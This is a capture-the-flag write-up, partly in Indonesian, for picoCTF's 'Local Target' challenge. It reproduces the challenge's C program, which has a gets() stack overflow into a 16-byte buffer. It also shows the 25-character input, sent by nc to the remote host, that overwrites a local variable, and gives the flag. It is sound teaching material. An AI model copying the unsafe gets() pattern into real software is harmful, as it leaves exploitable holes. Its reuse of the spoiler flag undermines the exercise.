<h1>Local Target</h1>
<h3>Description</h3>
<pre>
Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available <a href='https://artifacts.picoctf.net/c/517/local-target'>here</a>. You can view source <a href='https://artifacts.picoctf.net/c/517/local-target.c'>here</a>. And connect with it using:
nc saturn.picoctf.net 49487
</pre>
<h3>Solution</h3>

```c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}

```
<label>Check buffer overflow program</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaa  

num is 0
Bye!
```

<label>Buffer overflow pada offset 24, dan variabel num =  65 untuk memperoleh flag.txt yaitu chr(65) = 'A'</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# nc saturn.picoctf.net 49487                                          

Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```
<h3>Flag</h3>
<pre>
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
</pre>
